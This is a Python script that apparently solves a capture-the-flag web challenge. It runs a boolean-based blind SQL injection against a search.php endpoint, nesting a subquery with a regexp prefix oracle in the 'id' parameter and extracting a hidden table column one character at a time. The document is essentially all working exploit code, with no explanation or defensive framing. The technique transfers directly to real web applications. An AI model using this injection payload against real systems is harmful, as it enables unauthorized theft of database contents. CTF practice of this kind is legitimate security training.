#!/usr/bin/env python3
"""Fast regexp prefix extraction of Flaaaaag row 3"""
import urllib.request
import sys

BASE = "https://f4e3f42b4687b3d9401c897d.http-ctf2.dasctf.com/search.php"
ROW = 3

CHARS = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 _.-!?{}[]()@#$%^&*,;:/\\\"'~`+=<>|"

SPECIAL = set('.^$*+?{}[]()|\\')

def esc(s):
    r = ""
    for c in s:
        if c in SPECIAL:
            r += '\\' + c
        else:
            r += c
    return r

def check(prefix):
    sq = f"(select(fl4gawsl)from(Flaaaaag)where(id)={ROW})"
    cond = f"{sq}regexp('^{esc(prefix)}')"
    url = f"{BASE}?id=2-({cond})"
    try:
        resp = urllib.request.urlopen(url, timeout=10).read().decode('utf-8','ignore')
        return 'NO! Not this!' in resp
    except:
        return False

# Verify starting prefix
prefix = "Ohhh."
print(f"Verifying: {check(prefix)}")
if not check("Ohhh"):
    print("ERROR: Basic prefix check failed!")
    sys.exit(1)

# Try known next chars
for test_c in "You find the flag read on!":
    pass

# Extract
while len(prefix) < 500:
    found = False
    for c in CHARS:
        test = prefix + c
        if check(test):
            prefix = test
            sys.stdout.write(c)
            sys.stdout.flush()
            found = True
            break
    if not found:
        print(f"\n[DONE] Length={len(prefix)}")
        break
    if len(prefix) % 50 == 0:
        print(f"\n[{len(prefix)}]")

print(f"\n[FLAG] {prefix}")
